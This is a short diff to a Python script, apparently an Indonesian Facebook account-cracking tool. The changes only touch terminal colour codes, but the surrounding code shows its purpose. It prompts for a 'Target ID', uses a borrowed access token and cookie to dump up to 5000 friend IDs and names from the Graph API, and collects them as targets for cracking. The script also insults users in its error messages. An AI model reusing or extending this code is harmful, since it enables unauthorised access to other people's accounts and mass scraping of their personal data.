@@ -2056,14 +2056,14 @@ def xyzoncrackpublik():
 	except IOError:
 		exit()
 	cetak(panel('\t          [bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold red][[bold green] Crack Publik [bold red]]",style=f"bold red"))
-	pil = input(f' {P}[{H}+{P}]\33[1;96m Target ID \x1b[1;91m>{P} ')
+	pil = input(f' {P}[{H}+{P}]\33[1;96m Target ID \x1b[1;91m> \x1b[1;97m')
 	try:
 		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
 		for pi in koH['friends']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
 		print('')
-		print(f' {P}[{H}+{P}]\33[1;96m Total ID yang terkumpul \x1b[1;91m> {h}'+str(len(id)))
+		print(f' {P}[{H}+{P}]\33[1;96m Total ID yang terkumpul \x1b[1;91m>\x1b[1;92m '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Internet Lu Gak Ada Anjing')
@@ -2108,7 +2108,7 @@ def dump_massal():
 			print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Unstable Signal ')
 			exit()
 	try:
-		print(f' {P}[{H}+{P}]\33[1;96m Total Idz Target Yang Terkumpul{x} \x1b[1;91m> {h}'+str(len(id)))
+		print(f' {P}[{H}+{P}]\33[1;96m Total Idz Target Yang Terkumpul{x} \x1b[1;91m>\x1b[1;92m '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
